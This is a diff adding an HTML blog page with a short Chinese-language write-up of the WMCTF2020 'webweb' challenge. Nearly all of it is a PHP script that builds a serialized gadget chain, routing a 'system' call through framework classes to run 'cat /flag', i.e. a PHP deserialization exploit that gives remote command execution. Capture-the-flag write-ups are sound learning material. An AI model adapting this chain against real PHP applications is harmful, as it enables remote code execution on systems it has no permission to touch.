@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>WMCTF2020复现 - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=writeup>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">WMCTF2020复现</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#webweb"><span class="toc-text">webweb</span></a></li></ol>
+
+  <div class="post-content">
+    <p>还好有两个非预期，不然又是惨案(菜)</p>
+<h1 id="webweb"><a href="#webweb" class="headerlink" title="webweb"></a>webweb</h1><p>做的时候太晚了就睡觉去了…</p>
+<p>赛后找的链子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">lib</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">magic</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">lib</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">cursor</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">lib</span>\<span class="title">db</span>\<span class="title">sql</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">mapper</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">lib</span>\<span class="title">cli</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ws</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">cli</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">db</span>\<span class="title">sql</span>\<span class="title">Mapper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Agent</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $server;</span><br><span class="line">        <span class="keyword">protected</span> $socket;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($flag == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;server-&gt;events[<span class="string">'disconnect'</span>] = [(<span class="keyword">new</span> Agent(<span class="number">2</span>)), <span class="string">'fetch'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;server = <span class="keyword">new</span> Mapper();</span><br><span class="line">                <span class="keyword">$this</span>-&gt;socket = <span class="string">'cat /flag'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">db</span>\<span class="title">sql</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>()</span><br><span class="line">        &#123;</span><br><span class="line">            $<span class="title">this</span>-&gt;<span class="title">props</span> = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;read = <span class="string">'system'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">include1</span> = <span class="title">new</span> <span class="title">lib</span>\<span class="title">magic</span>();</span><br><span class="line">    $include2 = <span class="keyword">new</span> lib\db\cursor();</span><br><span class="line">    $include3 = <span class="keyword">new</span> lib\db\sql\mapper();</span><br><span class="line">    $include4 = <span class="keyword">new</span> lib\cli\ws();</span><br><span class="line">    $o = <span class="keyword">new</span> cli\Agent(<span class="number">1</span>);</span><br><span class="line">    $payload = [$include1,$include2,$include3,$include4,$o];</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($payload));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>太久没做这类题感觉生疏的不行…</p>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2020-08-04</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2025
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
